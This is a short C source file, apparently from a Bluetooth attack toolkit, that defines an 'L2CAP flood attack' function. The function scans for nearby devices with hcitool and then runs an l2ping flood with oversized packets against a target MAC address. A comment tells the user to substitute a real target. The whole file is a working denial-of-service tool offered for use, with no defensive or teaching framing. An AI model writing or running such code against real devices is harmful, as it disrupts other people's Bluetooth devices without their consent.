#include <stdio.h>
#include <stdlib.h>
#include "include/l2cap_flood.h"

void l2cap_flood_attack() {
    printf("[*] Starting L2CAP Flood Attack...\n");
    system("hcitool scan");  // List available devices
    system("l2ping -i hci0 -s 600 -f <TARGET_MAC>"); // Replace <TARGET_MAC> with a real target
}

